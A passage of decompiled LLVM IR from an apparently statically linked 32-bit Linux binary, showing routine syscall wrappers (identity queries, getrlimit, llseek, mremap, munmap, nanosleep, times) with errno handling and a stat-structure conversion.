  store i32 256, i32* @edx, align 4
  %v2_805462c = icmp slt i32 %v2_805461f, 0
  br i1 %v2_805462c, label %dec_label_pc_8054634, label %dec_label_pc_8054630

dec_label_pc_8054630:                             ; preds = %dec_label_pc_8054615
  %v3_8054630 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8054630, i32* @edx, align 4
  br label %dec_label_pc_8054634

dec_label_pc_8054634:                             ; preds = %dec_label_pc_8054615, %dec_label_pc_8054630
  %v0_8054634 = phi i32 [ 256, %dec_label_pc_8054615 ], [ %v3_8054630, %dec_label_pc_8054630 ]
  ret i32 %v0_8054634

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_8054634, { 1, 0 }
}

define i32 @function_805463a() local_unnamed_addr {
dec_label_pc_805463a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805463a = load i32, i32* @ebx, align 4
  store i32 %v0_805463a, i32* %stack_var_-4, align 4
  %v1_8054643 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054643, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8054643, -4095
  br i1 %tmp7, label %dec_label_pc_805465a, label %dec_label_pc_805464e

dec_label_pc_805464e:                             ; preds = %dec_label_pc_805463a
  %v1_805464e = call i32 @function_80526c9(i32 %v0_805463a)
  %v0_8054653 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054653 = sub i32 0, %v0_8054653
  %v2_8054655 = inttoptr i32 %v1_805464e to i32*
  store i32 %v1_8054653, i32* %v2_8054655, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805465e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805465a

dec_label_pc_805465a:                             ; preds = %dec_label_pc_805463a, %dec_label_pc_805464e
  %v2_805465e = phi i32 [ %v0_805463a, %dec_label_pc_805463a ], [ %v2_805465e.pre, %dec_label_pc_805464e ]
  %v0_805465a = phi i32 [ %v1_8054643, %dec_label_pc_805463a ], [ -1, %dec_label_pc_805464e ]
  store i32 %v2_805465e, i32* @ebx, align 4
  ret i32 %v0_805465a

; uselistorder directives
  uselistorder i32 %v1_8054643, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805465a, { 1, 0 }
}

define i32 @function_8054660() local_unnamed_addr {
dec_label_pc_8054660:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054660 = load i32, i32* @ebx, align 4
  store i32 %v0_8054660, i32* %stack_var_-4, align 4
  %v1_8054669 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8054669, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8054669, -4095
  br i1 %tmp7, label %dec_label_pc_8054680, label %dec_label_pc_8054674

dec_label_pc_8054674:                             ; preds = %dec_label_pc_8054660
  %v1_8054674 = call i32 @function_80526c9(i32 %v0_8054660)
  %v0_8054679 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054679 = sub i32 0, %v0_8054679
  %v2_805467b = inttoptr i32 %v1_8054674 to i32*
  store i32 %v1_8054679, i32* %v2_805467b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054684.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054680

dec_label_pc_8054680:                             ; preds = %dec_label_pc_8054660, %dec_label_pc_8054674
  %v2_8054684 = phi i32 [ %v0_8054660, %dec_label_pc_8054660 ], [ %v2_8054684.pre, %dec_label_pc_8054674 ]
  %v0_8054680 = phi i32 [ %v1_8054669, %dec_label_pc_8054660 ], [ -1, %dec_label_pc_8054674 ]
  store i32 %v2_8054684, i32* @ebx, align 4
  ret i32 %v0_8054680

; uselistorder directives
  uselistorder i32 %v1_8054669, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054680, { 1, 0 }
}

define i32 @function_8054686() local_unnamed_addr {
dec_label_pc_8054686:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054686 = load i32, i32* @ebx, align 4
  store i32 %v0_8054686, i32* %stack_var_-4, align 4
  %v1_805468f = call i32 @int80_syscall(i32 200)
  store i32 %v1_805468f, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805468f, -4095
  br i1 %tmp7, label %dec_label_pc_80546a6, label %dec_label_pc_805469a

dec_label_pc_805469a:                             ; preds = %dec_label_pc_8054686
  %v1_805469a = call i32 @function_80526c9(i32 %v0_8054686)
  %v0_805469f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805469f = sub i32 0, %v0_805469f
  %v2_80546a1 = inttoptr i32 %v1_805469a to i32*
  store i32 %v1_805469f, i32* %v2_80546a1, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546aa.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546a6

dec_label_pc_80546a6:                             ; preds = %dec_label_pc_8054686, %dec_label_pc_805469a
  %v2_80546aa = phi i32 [ %v0_8054686, %dec_label_pc_8054686 ], [ %v2_80546aa.pre, %dec_label_pc_805469a ]
  %v0_80546a6 = phi i32 [ %v1_805468f, %dec_label_pc_8054686 ], [ -1, %dec_label_pc_805469a ]
  store i32 %v2_80546aa, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80546a6

; uselistorder directives
  uselistorder i32 %v1_805468f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546a6, { 1, 0 }
}

define i32 @function_80546ac() local_unnamed_addr {
dec_label_pc_80546ac:
  %v0_80546ac = load i32, i32* @global_var_8056904.239, align 4
  %v1_80546b6 = icmp eq i32 %v0_80546ac, 0
  br i1 %v1_80546b6, label %dec_label_pc_80546bc, label %dec_label_pc_80546ba

dec_label_pc_80546ba:                             ; preds = %dec_label_pc_80546ac
  br label %dec_label_pc_80546bc

dec_label_pc_80546bc:                             ; preds = %dec_label_pc_80546ac, %dec_label_pc_80546ba
  %storemerge = phi i32 [ %v0_80546ac, %dec_label_pc_80546ba ], [ 4096, %dec_label_pc_80546ac ]
  %v0_80546bc = phi i32 [ %v0_80546ac, %dec_label_pc_80546ba ], [ 4096, %dec_label_pc_80546ac ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80546bc

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_80546bc, { 1, 0 }
}

define i32 @function_80546bf(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80546bf:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546bf = load i32, i32* @ebx, align 4
  store i32 %v0_80546bf, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80546d2 = call i32 @int80_syscall(i32 191)
  store i32 %v1_80546d2, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80546d2, -4095
  br i1 %tmp9, label %dec_label_pc_80546eb, label %dec_label_pc_80546df

dec_label_pc_80546df:                             ; preds = %dec_label_pc_80546bf
  %v1_80546df = call i32 @function_80526c9(i32 %v0_80546bf)
  %v0_80546e4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546e4 = sub i32 0, %v0_80546e4
  %v2_80546e6 = inttoptr i32 %v1_80546df to i32*
  store i32 %v1_80546e4, i32* %v2_80546e6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546ef.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546eb

dec_label_pc_80546eb:                             ; preds = %dec_label_pc_80546bf, %dec_label_pc_80546df
  %v2_80546ef = phi i32 [ %v0_80546bf, %dec_label_pc_80546bf ], [ %v2_80546ef.pre, %dec_label_pc_80546df ]
  %v0_80546eb = phi i32 [ %v1_80546d2, %dec_label_pc_80546bf ], [ -1, %dec_label_pc_80546df ]
  store i32 %v2_80546ef, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80546eb

; uselistorder directives
  uselistorder i32 %v1_80546d2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546eb, { 1, 0 }
}

define i32 @function_80546f1() local_unnamed_addr {
dec_label_pc_80546f1:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80546f1, i32* %stack_var_-4, align 4
  %v1_80546fa = call i32 @int80_syscall(i32 199)
  store i32 %v1_80546fa, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546fa, -4095
  br i1 %tmp7, label %dec_label_pc_8054711, label %dec_label_pc_8054705

dec_label_pc_8054705:                             ; preds = %dec_label_pc_80546f1
  %v1_8054705 = call i32 @function_80526c9(i32 %v0_80546f1)
  %v0_805470a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805470a = sub i32 0, %v0_805470a
  %v2_805470c = inttoptr i32 %v1_8054705 to i32*
  store i32 %v1_805470a, i32* %v2_805470c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054715.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054711

dec_label_pc_8054711:                             ; preds = %dec_label_pc_80546f1, %dec_label_pc_8054705
  %v2_8054715 = phi i32 [ %v0_80546f1, %dec_label_pc_80546f1 ], [ %v2_8054715.pre, %dec_label_pc_8054705 ]
  %v0_8054711 = phi i32 [ %v1_80546fa, %dec_label_pc_80546f1 ], [ -1, %dec_label_pc_8054705 ]
  store i32 %v2_8054715, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054711

; uselistorder directives
  uselistorder i32 %v1_80546fa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054711, { 1, 0 }
}

define i32 @function_8054717(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054717:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_805472d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805472d, i32* %esi.global-to-local, align 4
  %v1_8054744 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054744, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8054744, -4095
  br i1 %tmp18, label %dec_label_pc_805475e, label %dec_label_pc_8054750

dec_label_pc_8054750:                             ; preds = %dec_label_pc_8054717
  %v2_8054731 = ashr i32 %tmp8, 31
  %v1_8054750 = call i32 @function_80526c9(i32 %v2_8054731)
  %v0_8054755 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054755 = sub i32 0, %v0_8054755
  %v2_8054757 = inttoptr i32 %v1_8054750 to i32*
  store i32 %v1_8054755, i32* %v2_8054757, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054762

dec_label_pc_805475e:                             ; preds = %dec_label_pc_8054717
  %v1_805475e = icmp eq i32 %v1_8054744, 0
  br i1 %v1_805475e, label %dec_label_pc_8054767, label %dec_label_pc_8054762

dec_label_pc_8054762:                             ; preds = %dec_label_pc_805475e, %dec_label_pc_8054750
  %v0_8054762 = phi i32 [ %v1_8054744, %dec_label_pc_805475e ], [ -1, %dec_label_pc_8054750 ]
  %v1_8054764 = ashr i32 %v0_8054762, 31
  br label %dec_label_pc_805476f

dec_label_pc_8054767:                             ; preds = %dec_label_pc_805475e
  %v3_8054767 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805476f

dec_label_pc_805476f:                             ; preds = %dec_label_pc_8054762, %dec_label_pc_8054767
  %v0_8054775 = phi i32 [ %v0_8054762, %dec_label_pc_8054762 ], [ %v3_8054767, %dec_label_pc_8054767 ]
  %storemerge = phi i32 [ %v1_8054764, %dec_label_pc_8054762 ], [ %tmp, %dec_label_pc_8054767 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8054775

; uselistorder directives
  uselistorder i32 %v1_8054744, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 10, 6, 1, 2, 3, 4, 7, 5, 8, 0, 11 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805476f, { 1, 0 }
}

define i32 @function_8054776(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8054776:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054777 = load i32, i32* @esi, align 4
  store i32 %v0_8054777, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805478f = load i32, i32* @ebx, align 4
  %v5_8054797 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8054797 = ptrtoint i32* %v5_8054797 to i32
  store i32 %v0_805478f, i32* @ebx, align 4
  store i32 %v6_8054797, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8054797, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_80547a3, label %dec_label_pc_80547af

dec_label_pc_80547a3:                             ; preds = %dec_label_pc_8054776
  %v1_80547a3 = call i32 @function_80526c9(i32 %v0_805478f)
  %v0_80547a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80547a8 = sub i32 0, %v0_80547a8
  %v2_80547aa = inttoptr i32 %v1_80547a3 to i32*
  store i32 %v1_80547a8, i32* %v2_80547aa, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80547b2.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80547af

dec_label_pc_80547af:                             ; preds = %dec_label_pc_8054776, %dec_label_pc_80547a3
  %v2_80547b2 = phi i32 [ %v0_8054777, %dec_label_pc_8054776 ], [ %v2_80547b2.pre, %dec_label_pc_80547a3 ]
  %v0_80547af = phi i32 [ %v6_8054797, %dec_label_pc_8054776 ], [ -1, %dec_label_pc_80547a3 ]
  %v2_80547b1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80547b1, i32* @edx, align 4
  store i32 %v2_80547b2, i32* @esi, align 4
  ret i32 %v0_80547af

; uselistorder directives
  uselistorder i32 %v0_805478f, { 1, 0 }
  uselistorder label %dec_label_pc_80547af, { 1, 0 }
}

define i32 @function_80547b5(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80547b5:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80547b5 = load i32, i32* @ebx, align 4
  store i32 %v0_80547b5, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80547c8 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80547c8, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80547c8, -4095
  br i1 %tmp10, label %dec_label_pc_80547e1, label %dec_label_pc_80547d5

dec_label_pc_80547d5:                             ; preds = %dec_label_pc_80547b5
  %v1_80547d5 = call i32 @function_80526c9(i32 %v0_80547b5)
  %v0_80547da = load i32, i32* %ebx.global-to-local, align 4
  %v1_80547da = sub i32 0, %v0_80547da
  %v2_80547dc = inttoptr i32 %v1_80547d5 to i32*
  store i32 %v1_80547da, i32* %v2_80547dc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80547e5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80547e1

dec_label_pc_80547e1:                             ; preds = %dec_label_pc_80547b5, %dec_label_pc_80547d5
  %v2_80547e5 = phi i32 [ %v0_80547b5, %dec_label_pc_80547b5 ], [ %v2_80547e5.pre, %dec_label_pc_80547d5 ]
  %v0_80547e1 = phi i32 [ %v3_80547c8, %dec_label_pc_80547b5 ], [ -1, %dec_label_pc_80547d5 ]
  %v2_80547e3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80547e3, i32* @edx, align 4
  store i32 %v2_80547e5, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80547e1

; uselistorder directives
  uselistorder i32 %v3_80547c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80547e1, { 1, 0 }
}

define i32 @function_80547e7(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80547e7:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80547e7 = load i32, i32* @ebx, align 4
  store i32 %v0_80547e7, i32* %stack_var_-4, align 4
  %v4_80547eb = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80547eb, i32* %ebx.global-to-local, align 4
  %v6_80547fa = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_80547fa, i32* %ebx.global-to-local, align 4
  %tmp12 = icmp ult i32 %v6_80547fa, -4095
  br i1 %tmp12, label %dec_label_pc_8054813, label %dec_label_pc_8054807

dec_label_pc_8054807:                             ; preds = %dec_label_pc_80547e7
  %v1_8054807 = call i32 @function_80526c9(i32 %v0_80547e7)
  %v0_805480c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805480c = sub i32 0, %v0_805480c
  %v2_805480e = inttoptr i32 %v1_8054807 to i32*
  store i32 %v1_805480c, i32* %v2_805480e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054817.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054813

dec_label_pc_8054813:                             ; preds = %dec_label_pc_80547e7, %dec_label_pc_8054807
  %v2_8054817 = phi i32 [ %v0_80547e7, %dec_label_pc_80547e7 ], [ %v2_8054817.pre, %dec_label_pc_8054807 ]
  %v0_8054813 = phi i32 [ %v6_80547fa, %dec_label_pc_80547e7 ], [ -1, %dec_label_pc_8054807 ]
  %v2_8054815 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054815, i32* @edx, align 4
  store i32 %v2_8054817, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054813

; uselistorder directives
  uselistorder i32 %v6_80547fa, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054813, { 1, 0 }
}

define i32 @function_8054819(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054819:
  %stack_var_-12 = alloca i32, align 4
  %v0_805481a = load i32, i32* @ebx, align 4
  %v0_805481e = load i32, i32* @global_var_8056918.246, align 8
  %v1_805481e = icmp eq i32 %v0_805481e, 0
  %v1_8054829 = icmp eq i1 %v1_805481e, false
  br i1 %v1_8054829, label %dec_label_pc_805483c, label %dec_label_pc_805482b

dec_label_pc_805482b:                             ; preds = %dec_label_pc_8054819
  %v1_8054830 = call i32 @function_80549df(i32 0)
  %v2_8054838 = icmp slt i32 %v1_8054830, 0
  br i1 %v2_8054838, label %dec_label_pc_805485e, label %dec_label_pc_805482b.dec_label_pc_805483c_crit_edge

dec_label_pc_805482b.dec_label_pc_805483c_crit_edge: ; preds = %dec_label_pc_805482b
  %v0_805483e.pre = load i32, i32* @global_var_8056918.246, align 8
  br label %dec_label_pc_805483c

dec_label_pc_805483c:                             ; preds = %dec_label_pc_805482b.dec_label_pc_805483c_crit_edge, %dec_label_pc_8054819
  %v0_805484c = phi i32 [ %v0_805483e.pre, %dec_label_pc_805482b.dec_label_pc_805483c_crit_edge ], [ %v0_805481e, %dec_label_pc_8054819 ]
  %v1_805483c = icmp eq i32 %arg1, 0
  %v1_8054843 = icmp eq i1 %v1_805483c, false
  br i1 %v1_8054843, label %dec_label_pc_8054849, label %dec_label_pc_8054845

dec_label_pc_8054845:                             ; preds = %dec_label_pc_805483c
  br label %dec_label_pc_8054861

dec_label_pc_8054849:                             ; preds = %dec_label_pc_805483c
  store i32 %v0_805484c, i32* @ebx, align 4
  %v2_805484e = add i32 %v0_805484c, %arg1
  %v1_8054852 = call i32 @function_80549df(i32 %v2_805484e)
  %v2_805485a = icmp slt i32 %v1_8054852, 0
  %v1_805485c = icmp eq i1 %v2_805485a, false
  br i1 %v1_805485c, label %dec_label_pc_8054849.dec_label_pc_8054861_crit_edge, label %dec_label_pc_805485e

dec_label_pc_8054849.dec_label_pc_8054861_crit_edge: ; preds = %dec_label_pc_8054849
  %v0_8054861.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054861

dec_label_pc_805485e:                             ; preds = %dec_label_pc_8054849, %dec_label_pc_805482b
  br label %dec_label_pc_8054861

dec_label_pc_8054861:                             ; preds = %dec_label_pc_8054849.dec_label_pc_8054861_crit_edge, %dec_label_pc_8054845, %dec_label_pc_805485e
  %v0_8054861 = phi i32 [ %v0_8054861.pre, %dec_label_pc_8054849.dec_label_pc_8054861_crit_edge ], [ %v0_805484c, %dec_label_pc_8054845 ], [ -1, %dec_label_pc_805485e ]
  %v2_8054863 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054863, i32* @edx, align 4
  store i32 %v0_805481a, i32* @ebx, align 4
  ret i32 %v0_8054861

; uselistorder directives
  uselistorder i32 %v0_805484c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80549df, { 1, 0 }
  uselistorder label %dec_label_pc_8054861, { 2, 0, 1 }
}

define i32 @function_8054867(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8054867:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054867 = load i32, i32* @edi, align 4
  store i32 %v0_8054867, i32* %stack_var_-4, align 4
  %v4_805486b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_805486b, i32* %edi.global-to-local, align 4
  %v0_805486f = load i32, i32* @ebx, align 4
  %v3_8054877 = call i32 @times(%tms* %arg1)
  store i32 %v3_8054877, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8054877, -4095
  br i1 %tmp10, label %dec_label_pc_805488f, label %dec_label_pc_8054883

dec_label_pc_8054883:                             ; preds = %dec_label_pc_8054867
  %v1_8054883 = call i32 @function_80526c9(i32 %v0_805486f)
  %v0_8054888 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054888 = sub i32 0, %v0_8054888
  %v2_805488a = inttoptr i32 %v1_8054883 to i32*
  store i32 %v1_8054888, i32* %v2_805488a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8054893.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805488f

dec_label_pc_805488f:                             ; preds = %dec_label_pc_8054867, %dec_label_pc_8054883
  %v2_8054893 = phi i32 [ %v0_8054867, %dec_label_pc_8054867 ], [ %v2_8054893.pre, %dec_label_pc_8054883 ]
  %v0_805488f = phi i32 [ %v3_8054877, %dec_label_pc_8054867 ], [ -1, %dec_label_pc_8054883 ]
  store i32 %v2_8054893, i32* %edi.global-to-local, align 4
  ret i32 %v0_805488f

; uselistorder directives
  uselistorder i32 %v3_8054877, { 1, 0, 2 }
  uselistorder i32* @edi, { 8, 112, 113, 114, 115, 116, 172, 7, 173, 174, 175, 1, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 91, 92, 93, 94, 95, 96, 97, 98, 99, 194, 208, 209, 195, 196, 197, 198, 199, 200, 201, 202, 2, 203, 204, 205, 206, 207, 210, 211, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 9, 130, 131, 212, 213, 132, 133, 134, 135, 10, 214, 215, 11, 216, 217, 218, 219, 136, 3, 137, 138, 18, 19, 20, 21, 56, 57, 58, 59, 60, 61, 62, 63, 49, 50, 51, 22, 23, 24, 25, 26, 64, 65, 66, 37, 38, 39, 12, 13, 14, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 68, 69, 70, 55, 71, 72, 73, 52, 15, 16, 17, 67, 27, 28, 29, 30, 31, 32, 33, 48, 53, 54, 74, 75, 76, 77, 78, 79, 0, 6, 90, 80, 81, 82, 83, 84, 85, 86, 87, 89, 88, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 5, 170, 171, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 242, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805488f, { 1, 0 }
}

define i32 @function_8054895(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054895:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054896 = load i32, i32* @ebx, align 4
  store i32 %v0_8054896, i32* %stack_var_-8, align 4
  %v4_805489a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805489a, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_80548a7 = inttoptr i32 %arg2 to i8*
  %v4_80548a7 = call i32 @function_805271a(i8* %v3_80548a7, i32 0, i32 88)
  store i32 %v4_80548a7, i32* %eax.global-to-local, align 4
  %v2_80548ac = load i16, i16* %arg1, align 2
  %v3_80548ac = zext i16 %v2_80548ac to i32
  store i32 %v3_80548ac, i32* %eax.global-to-local, align 4
  %v0_80548af = load i32, i32* %ebx.global-to-local, align 4
  %v1_80548af = add i32 %v0_80548af, 4
  %v2_80548af = inttoptr i32 %v1_80548af to i32*
  store i32 0, i32* %v2_80548af, align 4
  %v0_80548b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80548b6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548b6 = inttoptr i32 %v1_80548b6 to i32*
  store i32 %v0_80548b6, i32* %v2_80548b6, align 4
  %v0_80548b8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80548b8 = add i32 %v0_80548b8, 4
  %v2_80548b8 = inttoptr i32 %v1_80548b8 to i32*
  %v3_80548b8 = load i32, i32* %v2_80548b8, align 4
  store i32 %v3_80548b8, i32* %eax.global-to-local, align 4
  %v1_80548bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548bb = add i32 %v1_80548bb, 12
  %v3_80548bb = inttoptr i32 %v2_80548bb to i32*
  store i32 %v3_80548b8, i32* %v3_80548bb, align 4
  %v0_80548be = load i32, i32* %esi.global-to-local, align 4
  %v1_80548be = add i32 %v0_80548be, 8
  %v2_80548be = inttoptr i32 %v1_80548be to i16*
  %v3_80548be = load i16, i16* %v2_80548be, align 2
  %v4_80548be = zext i16 %v3_80548be to i32
  store i32 %v4_80548be, i32* %eax.global-to-local, align 4
  %v1_80548c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548c2 = add i32 %v1_80548c2, 16
  %v3_80548c2 = inttoptr i32 %v2_80548c2 to i32*
  store i32 %v4_80548be, i32* %v3_80548c2, align 4
  %v0_80548c5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80548c5 = add i32 %v0_80548c5, 10
  %v2_80548c5 = inttoptr i32 %v1_80548c5 to i16*
  %v3_80548c5 = load i16, i16* %v2_80548c5, align 2
  %v4_80548c5 = zext i16 %v3_80548c5 to i32
  store i32 %v4_80548c5, i32* %eax.global-to-local, align 4
  %v1_80548c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548c9 = add i32 %v1_80548c9, 20
  %v3_80548c9 = inttoptr i32 %v2_80548c9 to i32*
  store i32 %v4_80548c5, i32* %v3_80548c9, align 4
  %v0_80548cc = load i32, i32* %esi.global-to-local, align 4
  %v1_80548cc = add i32 %v0_80548cc, 12
  %v2_80548cc = inttoptr i32 %v1_80548cc to i16*
  %v3_80548cc = load i16, i16* %v2_80548cc, align 2
  %v4_80548cc = zext i16 %v3_80548cc to i32
  store i32 %v4_80548cc, i32* %eax.global-to-local, align 4
  %v1_80548d0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548d0 = add i32 %v1_80548d0, 24
  %v3_80548d0 = inttoptr i32 %v2_80548d0 to i32*
  store i32 %v4_80548cc, i32* %v3_80548d0, align 4
  %v0_80548d3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80548d3 = add i32 %v0_80548d3, 14
  %v2_80548d3 = inttoptr i32 %v1_80548d3 to i16*
  %v3_80548d3 = load i16, i16* %v2_80548d3, align 2
  %v4_80548d3 = zext i16 %v3_80548d3 to i32
  store i32 %v4_80548d3, i32* %eax.global-to-local, align 4
  %v1_80548d7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548d7 = add i32 %v1_80548d7, 28
  %v3_80548d7 = inttoptr i32 %v2_80548d7 to i32*
  store i32 %v4_80548d3, i32* %v3_80548d7, align 4
  %v0_80548da = load i32, i32* %esi.global-to-local, align 4
  %v1_80548da = add i32 %v0_80548da, 16
  %v2_80548da = inttoptr i32 %v1_80548da to i16*
  %v3_80548da = load i16, i16* %v2_80548da, align 2
